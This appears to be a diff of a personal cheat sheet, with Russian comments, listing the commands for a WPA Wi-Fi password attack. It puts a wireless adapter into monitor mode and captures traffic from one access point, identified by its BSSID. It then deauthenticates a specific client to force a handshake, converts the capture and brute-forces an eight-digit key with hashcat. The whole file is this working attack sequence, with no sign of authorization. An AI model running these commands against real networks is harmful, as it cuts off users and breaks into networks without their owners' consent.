@@ -12,17 +12,27 @@ sudo ip link set wlan0 up
 
 iw dev
 
+# режим монитора
 
-# Режим монитора
-
+sudo airmon-ng check kill
 sudo airmon-ng start wlan1
+
+# скан всех сетй 
 
 sudo airodump-ng wlan1 
 
-# Запись дампа из точки доступа
+# прослушивание конкретной сети
 
-sudo airodump-ng wlan1 --channel 11 -w cap2
+sudo airodump-ng --bssid C4:6E:1F:71:EC:16 --channel 1 -w test wlan1
 
-# Деаутентификация
+# деауз
 
-sudo aireplay-ng -0 5 -a A8:5E:45:B8:23:D8 wlan1
+sudo aireplay-ng --deauth 10 -a C4:6E:1F:71:EC:16 -c 32:B8:F4:5F:FB:65 wlan1
+
+sudo airmon-ng stop wlan1
+sudo systemctl restart NetworkManager
+
+
+hcxpcapngtool -o hash.hc22000 test-01.cap
+
+hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d
